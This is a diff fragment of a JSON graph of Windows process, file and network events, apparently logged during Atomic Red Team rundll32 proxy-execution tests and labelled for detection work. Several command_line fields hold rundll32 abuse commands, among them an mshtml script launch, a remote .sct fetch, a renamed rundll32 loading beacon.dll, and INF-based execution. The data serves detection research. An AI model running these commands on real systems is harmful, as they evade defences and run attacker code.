-    {
-      "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:17",
-      "label": "postex_456a",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "postex_456a",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
-        "event_id": "17",
-        "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "postex_456a",
-        "name": "postex_456a"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{D700CDCA-C0BE-6022-B4A1-00000000A301}",
-        "pid": "6520",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "f7468ae7f32434e4af53d9eaef5ed53681022d611a5919cd0d3ea4474a11ff9d",
-        "parent_process_id": "Process:{D700CDCA-8E14-6021-A97C-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:10",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rundll32.exe",
-        "guid": "{9014E149-04AA-5FC5-EB00-000000009101}",
-        "pid": "2776",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x100000 for rundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "167d1564d851cf9ca3561a5b25e6db3e3a8f3cfa7718f8ffba2fa3097ed2dcfd",
-        "parent_process_id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
+        "command_hash": "994ac093220e5bc3023d3f33967ecd47aa7ecf5c613657474b852f2525f6d9ef",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
         "user_id": "User:S-1-5-18",
         "event_id": "10",
-        "id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:10",
+        "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:10",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "rundll32.exe",
         "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-BFB8-6022-89A1-00000000A301}",
-        "pid": "7176",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:10",
-      "label": "notrundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "notrundll32.exe",
-        "guid": "{1AADB668-6316-601C-710B-00000000A301}",
-        "pid": "5416",
-        "image_path": "c:\\temp\\notrundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for notrundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "3ec727cd48f730ecd23ad073356ecc96e260eb85da96430fb9dfd1dddb399666",
-        "parent_process_id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{1AADB668-6316-601C-710B-00000000A301}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notrundll32.exe",
-        "name": "notrundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{9014E149-05D6-5FC5-5C01-000000009101}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{9014E149-05D6-5FC5-5C01-000000009101}",
-        "pid": "3668",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "mshtml,runhtmlapplication \"+string(createobject(\"wscript.shell\").run(\"calc.exe\"),0) <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "955bdd2df39804972be3790bdf7c5529b063a3520218dfcfab0cc678e7e7fb84",
-        "parent_process_id": "Process:{9014E149-05D6-5FC5-5B01-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{9014E149-05D6-5FC5-5C01-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{D700CDCA-C0E7-6022-CAA1-00000000A301}",
-        "pid": "6484",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "%system32%\\rundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "5ab9ecca5d68b30cc81b8eb9aec8420452b73ea6b0108f8c6a53fa8c356ed348",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{D700CDCA-C05C-6022-A3A1-00000000A301}",
-        "pid": "7992",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{D700CDCA-8E14-6021-A97C-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C082-6022-A7A1-00000000A301}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{D700CDCA-C082-6022-A7A1-00000000A301}",
-        "pid": "7952",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c c:\\temp\\notrundll32.exe c:\\payloads\\beacon.dll,start <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "c295196469f7de13ca340abf3d5a5cd0515ec7f199303d4b612eedabac0fd90a",
-        "parent_process_id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C082-6022-A7A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{9014E149-04A8-5FC5-E100-000000009101}",
-        "pid": "4664",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper> <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "dca7397ba3159303f70ec38566f38e84714e2a13eb81f01c24fd6656b2cc2779",
-        "event_id": "1",
-        "id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{9014E149-04A8-5FC5-E000-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:10",
-      "label": "notrundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "notrundll32.exe",
-        "guid": "{D700CDCA-C0EE-6022-CCA1-00000000A301}",
-        "pid": "7116",
-        "image_path": "c:\\temp\\notrundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1400 for notrundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "749090828e107d12749b37012b69f93512b743d1c61778ae1a27e75933b1a791",
-        "parent_process_id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notrundll32.exe",
-        "name": "notrundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
-      "label": "taskmgr.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-5543-6021-B175-00000000A301}",
-        "pid": "7460",
-        "image_path": "%system32%\\taskmgr.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "taskmgr.exe",
-        "name": "taskmgr.exe"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-0703-5FC5-D101-000000009101}",
-        "pid": "1388",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe ieadvpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "ed3d49aafb4015a538b0d643ae8ead0c2ea5ff429a16a2f28f4a58dacaadc82b",
-        "event_id": "1",
-        "id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "network:<private_ip>:80:tcp",
-      "label": "<PRIVATE_IP>",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "<PRIVATE_IP>",
-        "destination_port": "80",
-        "protocol": "tcp",
-        "domain_name": "ip-10-0-1-16.us-west-2.compute.internal",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-BFB8-6022-89A1-00000000A301}:1",
-        "event_id": "3",
-        "id": "network:<private_ip>:80:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "<PRIVATE_IP>",
-        "name": "<PRIVATE_IP>"
-      }
-    },
-    {
-      "id": "File:6da22ed04c16469ceaa8b6ae5daf492b2fe18ba9b21e6c9e28452356c28dcb6d:17",
-      "label": "msse-1996-server",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "msse-1996-server",
-        "source_image_path": "%system32%\\rundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
-        "event_id": "17",
-        "id": "File:6da22ed04c16469ceaa8b6ae5daf492b2fe18ba9b21e6c9e28452356c28dcb6d:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "msse-1996-server",
-        "name": "msse-1996-server"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
-      "label": "winrshost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for winrm's remote shell plugin",
-        "guid": "{9014E149-04A8-5FC5-DD00-000000009101}",
-        "pid": "4436",
-        "image_path": "%system32%\\winrshost.exe",
-        "command_line": "%system32%\\winrshost.exe -embedding",
-        "original_file_name": "winrshost.exe",
-        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
-        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
-        "event_id": "1",
-        "id": "Process:{9014E149-04A8-5FC5-DD00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "winrshost.exe",
-        "name": "winrshost.exe",
-        "parent_process_id": "Process:{9014E149-0448-5FC5-0C00-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
-      "label": "csrss.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{1AADB668-4FDB-601C-CC08-00000000A301}",
-        "pid": "3644",
-        "image_path": "%system32%\\csrss.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{1AADB668-4FDB-601C-CC08-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "csrss.exe",
-        "name": "csrss.exe"
       }
     },
     {
@@ -1590,102 +704,6 @@
       }
     },
     {
-      "id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
-      "label": "notrundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{D700CDCA-C0FA-6022-CEA1-00000000A301}",
-        "pid": "2836",
-        "image_path": "c:\\temp\\notrundll32.exe",
-        "command_line": "c:\\temp\\notrundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
-        "command_hash": "ee66fdf9fbd9ffe53e162f78d5781e5a4c496a1557b070b809f0792e37f98830",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0FA-6022-CEA1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notrundll32.exe",
-        "name": "notrundll32.exe",
-        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D301-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-0703-5FC5-D301-000000009101}",
-        "pid": "1228",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe syssetup.dll,setupinfobjectinstallaction defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "f02ef0b4eb47a7fd07950c51d45c2eced1934c873ac42a22c441bd1fabb62a48",
-        "event_id": "1",
-        "id": "Process:{9014E149-0703-5FC5-D301-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{834264DD-651B-6206-F500-000000002802}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{834264DD-651B-6206-F500-000000002802}",
-        "pid": "6560",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll #2",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
-        "command_hash": "9b184bdafc009587b08933d214a36e0246ad052b6dcb4829c9f0d804aeb255a3",
-        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{834264DD-651B-6206-F500-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
-      "label": "csrss.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "client server runtime process",
-        "guid": "{9014E149-0446-5FC5-0500-000000009101}",
-        "pid": "640",
-        "image_path": "%system32%\\csrss.exe",
-        "command_line": "%%systemroot%%\\system32\\csrss.exe objectdirectory=\\windows sharedsection=1024,20480,768 windows=on subsystemtype=windows serverdll=basesrv,1 serverdll=winsrv:userserverdllinitialization,3 serverdll=sxssrv,4 profilecontrol=off maxrequestthreads=16",
-        "original_file_name": "csrss.exe",
-        "image_hash": "MD5=955E9227AA30A08B7465C109B863B886,SHA256=D896480BC8523FAD3AE152C81A2B572022C3778A34A6D85E089D150A68E9165E,IMPHASH=273BC9D936389D79244E6E56BE5096B6",
-        "command_hash": "319830b380c6be2431adbc10c58121192cdbf4e087d98b1ecebf350fdb98e572",
-        "event_id": "1",
-        "id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "csrss.exe",
-        "name": "csrss.exe",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0400-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
       "id": "Process:{D700CDCA-C0EE-6022-CBA1-00000000A301}:1",
       "label": "cmd.exe",
       "type": "process",
@@ -1701,192 +719,6 @@
         "command_hash": "4df693aee3370efed4b16e1d6250665a5164c2dc158f2915538f38cc47eb9342",
         "event_id": "1",
         "id": "Process:{D700CDCA-C0EE-6022-CBA1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{834264DD-651A-6206-F300-000000002802}:1",
-      "label": "windows host process (rundll32)",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows host process (rundll32)",
-        "guid": "{834264DD-651A-6206-F300-000000002802}",
-        "pid": "6564",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll,#2 <rundll32_abuse>",
-        "original_file_name": "rundll32.exe",
-        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
-        "command_hash": "bc135980fc2714dc6656d261c7693de1f7035833da124ae02c2839b67c87c478",
-        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{834264DD-651A-6206-F300-000000002802}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows host process (rundll32)",
-        "name": "windows host process (rundll32)"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:10",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rundll32.exe",
-        "guid": "{9014E149-0703-5FC5-D601-000000009101}",
-        "pid": "3924",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for rundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "994ac093220e5bc3023d3f33967ecd47aa7ecf5c613657474b852f2525f6d9ef",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{9014E149-0703-5FC5-D601-000000009101}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{D700CDCA-944A-601D-1600-00000000A301}",
-        "pid": "1544",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{9014E149-04AA-5FC5-EA00-000000009101}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{9014E149-04AA-5FC5-EA00-000000009101}",
-        "pid": "4452",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\mshtml,runhtmlapplication \";document.write();getobject(\"script:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.011\\src\\t1218.011.sct\").exec(); <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "0755e90a2d6301113d5bdafd46616f4fe2f3330c5062e07434e89f2fe721f145",
-        "event_id": "1",
-        "id": "Process:{9014E149-04AA-5FC5-EA00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "File:94ee6edde723d77dfeed0d4f4849760a308fb2f308268f3382eca213f487742b:17",
-      "label": "msse-8558-server",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "msse-8558-server",
-        "source_image_path": "c:\\temp\\notrundll32.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
-        "event_id": "17",
-        "id": "File:94ee6edde723d77dfeed0d4f4849760a308fb2f308268f3382eca213f487742b:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "msse-8558-server",
-        "name": "msse-8558-server"
-      }
-    },
-    {
-      "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:10",
-      "label": "rundll32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rundll32.exe",
-        "guid": "{9014E149-0702-5FC5-D001-000000009101}",
-        "pid": "2868",
-        "image_path": "%system32%\\rundll32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1478 for rundll32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "9fa7242b47f2b7dc31f3842a93168f5d02a6561efd65a784dfba9ab5e561ffed",
-        "parent_process_id": "Process:{9014E149-0446-5FC5-0B00-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rundll32.exe",
-        "name": "rundll32.exe"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0BF-6022-B6A1-00000000A301}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{D700CDCA-C0BF-6022-B6A1-00000000A301}",
-        "pid": "4116",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "cmd.exe  \\c c:\\temp\\notrundll32.exe c:\\payloads\\beacon.dll,startw <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "0d85b0b1674a71a29d9f3bd586b542d7d3534e32bd75cee8e63f15e97a1b48d6",
-        "parent_process_id": "Process:{D700CDCA-C0BE-6022-B4A1-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0BF-6022-B6A1-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{D700CDCA-C0E7-6022-C9A1-00000000A301}",
-        "pid": "5464",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "cmd.exe  \\c %system32%\\rundll32.exe c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
-        "original_file_name": "cmd.exe",
